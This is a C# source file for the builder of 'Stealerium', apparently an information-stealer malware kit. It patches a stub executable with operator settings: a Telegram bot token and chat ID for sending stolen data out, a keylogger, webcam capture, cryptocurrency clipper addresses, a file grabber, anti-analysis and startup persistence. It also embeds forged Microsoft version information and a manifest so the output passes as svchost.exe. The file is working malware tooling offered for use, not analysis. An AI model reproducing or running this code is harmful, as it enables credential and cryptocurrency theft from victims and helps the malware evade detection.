using Mono.Cecil;
using Mono.Cecil.Cil;
using System.IO;
using System.Text;

namespace Stealerium.Builder
{
    internal sealed class Build
    {
        private static readonly Random random = new();

        public static readonly Dictionary<string, string> ConfigValues = new()
        {
            {"TelegramAPI", ""},         // Stores the encrypted Telegram bot API token
            {"TelegramID", ""},          // Stores the encrypted Telegram chat ID
            {"Debug", ""},               // Stores debug setting
            {"AntiAnalysis", ""},        // Stores anti-analysis setting
            {"Startup", ""},             // Stores startup option setting
            {"StartDelay", ""},          // Stores start delay option
            {"ClipperBTC", ""},          // Stores encrypted Bitcoin address for clipper
            {"ClipperETH", ""},          // Stores encrypted Ethereum address for clipper
            {"ClipperLTC", ""},          // Stores encrypted Litecoin address for clipper
            {"WebcamScreenshot", ""},    // Stores webcam screenshot option
            {"Keylogger", ""},           // Stores keylogger setting
            {"Clipper", ""},             // Stores clipper option
            {"Grabber", ""},             // Stores grabber setting
            {"Mutex", RandomString(20)}  // Generates a random mutex string
        };


        private static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private static AssemblyDefinition ReadStub(string stubPath)
        {
            if (!File.Exists(stubPath))
                throw new FileNotFoundException("Stub file not found.", stubPath);

            return AssemblyDefinition.ReadAssembly(stubPath);
        }

        private static void WriteStub(AssemblyDefinition definition, string outputPath)
        {
            definition.Write(outputPath);
        }

        private static string ReplaceConfigParams(string value)
        {
            // If the value contains the key, perform the replacement
            foreach (KeyValuePair<string, string> config in ConfigValues)
            {
                if (value.Contains($"--- {config.Key} ---"))
                {
                    return config.Value; // Replace with the actual config value
                }
            }

            return value; // Return the original value if no replacement is made
        }

        public static AssemblyDefinition IterValues(AssemblyDefinition definition)
        {
            foreach (ModuleDefinition module in definition.Modules)
            {
                foreach (TypeDefinition type in module.Types)
                {
                    if (type.Name.Equals("Config"))
                    {
                        foreach (MethodDefinition method in type.Methods)
                        {
                            if (method.IsConstructor && method.HasBody)
                            {
                                foreach (Instruction instruction in method.Body.Instructions)
                                {
                                    if (instruction.OpCode.Code == Code.Ldstr &&
                                        instruction.Operand is string operand &&
                                        operand.StartsWith("---") && operand.EndsWith("---"))  // More flexible check
                                    {
                                        instruction.Operand = ReplaceConfigParams(operand);
                                    }
                                }
                            }
                        }
                    }
                }
            }
            return definition;
        }


        public static string BuildStub(string outputPath, string stubPath = null)
        {
            try
            {
                // Use provided stub path or default
                stubPath ??= Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Stub\\Stealerium.Stub.exe");
                
                // Read the stub
                var assembly = ReadStub(stubPath);

                // Replace config parameters
                assembly = IterValues(assembly);

                // Add resource manipulation
                AddStealthResources(assembly);

                // Write the modified stub
                WriteStub(assembly, outputPath);
                
                return outputPath;
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to build stub: {ex.Message}");
            }
        }

        private static void AddStealthResources(AssemblyDefinition assembly)
        {
            try
            {
                // Add version info resource
                var versionInfo = new Dictionary<string, string>
                {
                    { "ProductVersion", "10.0.19045.3803" },
                    { "CompanyName", "Microsoft Corporation" },
                    { "ProductName", "Microsoft® Windows® Operating System" },
                    { "LegalCopyright", " Microsoft Corporation. All rights reserved." },
                    { "FileDescription", "Windows System Component" },
                    { "OriginalFilename", "svchost.exe" },
                    { "InternalName", "System Service Host" },
                    { "Comments", "Windows System Component" },
                    { "BuildVersion", "3803" },
                    { "PrivateBuild", "19045" }
                };

                // Add resources
                foreach (var info in versionInfo)
                {
                    var resource = new EmbeddedResource($"Resources.{info.Key}", 
                        ManifestResourceAttributes.Public, 
                        Encoding.UTF8.GetBytes(info.Value));
                    
                    assembly.MainModule.Resources.Add(resource);
                }

                // Add system messages
                var systemMessages = new Dictionary<string, string>
                {
                    { "SVC_START", "Windows service started successfully" },
                    { "SVC_STOP", "Windows service stopped" },
                    { "SVC_PAUSE", "Service paused" },
                    { "SVC_RESUME", "Service resumed" },
                    { "NET_CONNECT", "Network connection established" },
                    { "UPDATE_CHECK", "Checking for Windows updates..." },
                    { "SEC_SCAN", "Security scan in progress" }
                };

                foreach (var msg in systemMessages)
                {
                    var resource = new EmbeddedResource($"Resources.SYS_{msg.Key}", 
                        ManifestResourceAttributes.Public, 
                        Encoding.UTF8.GetBytes(msg.Value));
                    
                    assembly.MainModule.Resources.Add(resource);
                }

                // Add Windows icons as resources
                byte[] iconData = Convert.FromBase64String("/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAMCAgMCAgMDAwMEAwMEBQgFBQQEBQoHBwYIDAoMDAsKCwsNDhIQDQ4RDgsLEBYQERMUFRUVDA8XGBYUGBIUFRT/2wBDAQMEBAUEBQkFBQkUDQsNFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBT/wAARCAAQABADASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD9U6KKKACiiigD/9k="); // This is a 16x16 Windows-style icon
                var iconResource = new EmbeddedResource("Resources.AppIcon", 
                    ManifestResourceAttributes.Public, 
                    iconData);
                
                assembly.MainModule.Resources.Add(iconResource);

                // Add manifest resource
                string manifestXml = @"<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>
<assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0"">
  <assemblyIdentity version=""10.0.19041.1"" processorArchitecture=""x86"" name=""Microsoft.Windows.SystemComponent"" type=""win32""/>
  <description>Windows System Component</description>
  <dependency>
    <dependentAssembly>
      <assemblyIdentity type=""win32"" name=""Microsoft.Windows.Common-Controls"" version=""6.0.0.0"" processorArchitecture=""*"" publicKeyToken=""6595b64144ccf1df"" language=""*""/>
    </dependentAssembly>
  </dependency>
  <trustInfo xmlns=""urn:schemas-microsoft-com:asm.v3"">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level=""asInvoker"" uiAccess=""false""/>
      </requestedPrivileges>
    </security>
  </trustInfo>
</assembly>";

                var manifestResource = new EmbeddedResource("Resources.Manifest", 
                    ManifestResourceAttributes.Public, 
                    Encoding.UTF8.GetBytes(manifestXml));
                
                assembly.MainModule.Resources.Add(manifestResource);
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to add stealth resources: {ex.Message}");
            }
        }
    }
}
